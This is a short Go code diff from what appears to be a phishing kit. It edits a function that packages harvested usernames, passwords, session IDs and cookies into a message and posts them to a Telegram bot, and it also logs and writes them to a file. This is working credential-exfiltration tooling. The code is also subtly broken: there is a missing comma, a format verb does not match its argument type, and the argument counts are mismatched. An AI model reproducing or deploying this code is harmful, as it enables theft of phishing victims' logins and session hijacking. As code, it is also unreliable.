@@ -66,12 +66,12 @@ func getChatId() string {
 // 	return true, nil
 // }
 
-func sendEmailCookie(cookies string, phishlet string, username string, password string, sessionId string) {
+func sendEmailCookie(cookies string, id string, phishlet string, username string, password string, sessionId string) {
 
 	// Send the message
 	var err error
 	url := fmt.Sprintf("%s/sendMessage", getUrl())
-	msg := fmt.Sprintf("[ 🍁 %s Cookies Result 🍁 ]\n\n********* [ 💻 Valid Login  💻 ] ********\n🌟 Username :   %s\n🔑 Password :   %s\n🏷️ Key_user:   %s\n💻 Session_id:   %s\n*******[ 🍪 Cookies Captured 🍪 ] **********",phishlet username, password, sessionId)
+	msg := fmt.Sprintf("[ 🍁 %d %s Cookies Result 🍁 ]\n\n********* [ 💻 Valid Login  💻 ] ********\n🌟 Username :   %s\n🔑 Password :   %s\n🏷️ Key_user:   %s\n💻 Session_id:   %s\n\n*******[ 🍪 Cookies Captured 🍪 ] **********",id, phishlet, username, password, sessionId)
 	
 	postBody, _ := json.Marshal(map[string]string{
 		"chat_id":    getChatId(),
@@ -94,7 +94,7 @@ func sendEmailCookie(cookies string, phishlet string, username string, password 
 		fmt.Printf("Unable to write file: %v", err)
 	}
 
-	log.Println("Send Email/Telegram Cookies : (%s) [%s] {%s}", username, password, sessionId)
+	log.Println("Send Email/Telegram Cookies", username, password)
 	
 	// Return
 	return
